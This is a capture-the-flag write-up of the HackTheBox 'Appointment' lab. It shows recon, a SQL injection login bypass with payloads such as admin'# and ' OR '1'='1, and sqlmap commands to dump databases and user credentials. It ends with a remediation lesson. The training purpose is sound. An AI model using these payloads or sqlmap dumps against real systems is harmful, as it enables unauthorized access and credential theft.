# Appointment

**Platform:** HackTheBox — Starting Point  
**Category:** Web Application Attacks  
**OS:** Linux  
**Difficulty:** Very Easy  
**Date:** 2025  

---

## Summary
This machine exposed a web application with a login form vulnerable 
to SQL injection. By injecting a classic SQL payload into the 
username field, the authentication query was manipulated to return 
true without requiring a valid password, granting immediate admin 
access and revealing the flag.

---

## Recon

```bash
nmap -sV -sC 10.129.X.X -oN nmap.txt
```

Nmap revealed a single open port — a web server on port 80 
running Apache.
```
80/tcp open  http  Apache httpd 2.4.38
|_http-title: Login
```
The page title returned by Nmap was "Login" — confirming a 
login form is the entry point.

---

## Enumeration
Browsed to the web application on port 80. The page presented 
a simple login form with username and password fields. No other 
pages were immediately visible.

Ran Gobuster to check for additional hidden pages while 
examining the login form manually:

```bash
gobuster dir -u http://10.129.X.X \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt -t 50
```

The login form itself was the primary attack surface. Tested 
for SQL injection by entering a single quote in the username 
field to check if the application returns an error:
```
Username: '
Password: test
```
The application returned a database error, confirming the 
input is passed directly to a SQL query without sanitization.

---

## Exploitation
Used a classic SQL injection payload to bypass authentication. 
The logic works by closing the SQL string early and appending 
a condition that is always true, then commenting out the rest 
of the query including the password check.
```
Username: admin'#
Password: (anything)
```
How this works at the database level, the original query 
the application runs is likely:

```sql
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
```

After injection it becomes:

```sql
SELECT * FROM users WHERE username='admin'#' AND password='anything'
```

The `#` comments out everything after it including the 
password check. The query returns the admin user record 
and authentication succeeds.

Alternative payloads that also work:
```
' OR '1'='1
' OR 1=1--
' OR 'x'='x
```
Logged in with the payload and gained access to the 
application dashboard. The flag was displayed on the page 
after successful login.

---

## Post-Exploitation
In a real penetration test, SQL injection on a login form 
is just the starting point. The next steps would be using 
sqlmap to enumerate the full database, extract all user 
credentials, check for file read/write capabilities, and 
potentially achieve remote code execution via INTO OUTFILE 
to write a webshell.

```bash
# Automate full SQL injection exploitation with sqlmap
sqlmap -u "http://10.129.X.X/login.php" \
  --data="username=admin&password=test" \
  --dbs

# Dump all tables from found database
sqlmap -u "http://10.129.X.X/login.php" \
  --data="username=admin&password=test" \
  -D database_name --tables

# Dump credentials
sqlmap -u "http://10.129.X.X/login.php" \
  --data="username=admin&password=test" \
  -D database_name -T users --dump
```

---

## Key Lesson
This machine demonstrates SQL injection authentication bypass — 
one of the most well-known and still widely encountered 
vulnerabilities in web applications. SQL injection occurs when 
user input is incorporated directly into a database query without 
proper sanitization or parameterization. The database cannot 
distinguish between the intended query structure and the injected 
code, so it executes whatever the attacker supplies.

Authentication bypass via SQL injection is particularly dangerous 
because it requires no prior knowledge of valid credentials. A 
single quote in the username field is enough to test for the 
vulnerability — if the application returns a database error or 
behaves differently, SQL injection is likely present.

SQL injection consistently appears in the OWASP Top 10 list of 
most critical web application security risks. Despite being a 
well-understood vulnerability with known fixes, it remains 
extremely common in real applications, particularly in older 
codebases and custom-built systems.

In a real penetration test, SQL injection on a login form is 
a critical finding that gives immediate access to the application 
and potentially the entire database. The real impact goes far 
beyond login bypass — depending on database permissions, an 
attacker can read sensitive data, modify records, delete tables, 
read server files, and in some configurations execute operating 
system commands.

The fix is straightforward — use parameterized queries or 
prepared statements instead of concatenating user input directly 
into SQL queries. Input validation and a web application firewall 
add additional layers of defense but are not substitutes for 
parameterized queries.
